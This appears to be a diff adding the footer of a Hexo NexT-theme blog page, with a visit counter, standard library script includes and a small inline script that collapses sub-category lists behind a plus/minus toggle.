+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+function initCategoryFold() {
+  // 找到所有包含了子分类的 <ul>
+  var childLists = document.querySelectorAll('.category-list-child');
+  
+  childLists.forEach(function(child) {
+    // 防抖：防止 PJAX 刷新导致重复注入图标
+    if (child.parentElement.getAttribute('data-folded') === 'true') return;
+    child.parentElement.setAttribute('data-folded', 'true');
+    
+    // 1. 默认把所有子分类强行隐藏
+    child.style.display = 'none'; 
+    
+    // 2. 创建一个带有黑客风的 [+]/[-] 开关
+    var toggleSpan = document.createElement('span');
+    toggleSpan.innerHTML = ' ➕ ';
+    toggleSpan.style.cursor = 'pointer';
+    toggleSpan.style.fontSize = '12px';
+    toggleSpan.style.marginRight = '5px';
+    
+    // 3. 把开关插到父分类名字的前面
+    var parentLi = child.parentElement;
+    parentLi.insertBefore(toggleSpan, parentLi.firstChild);
+    
+    // 4. 给开关绑定点击事件 (Hook)
+    toggleSpan.addEventListener('click', function(e) {
+      e.stopPropagation(); // 阻止事件冒泡，防止误点分类链接
+      if (child.style.display === 'none') {
+        child.style.display = 'block';
+        toggleSpan.innerHTML = ' ➖ ';
+      } else {
+        child.style.display = 'none';
+        toggleSpan.innerHTML = ' ➕ ';
+      }
+    });
+  });
+}
+
+// 首次加载页面时执行
+document.addEventListener("DOMContentLoaded", initCategoryFold);
+// 如果你的 NexT 开启了 PJAX (无刷新跳转)，保证跳转后依然生效
+document.addEventListener("pjax:success", initCategoryFold);
+</script>
+</body>
+</html>
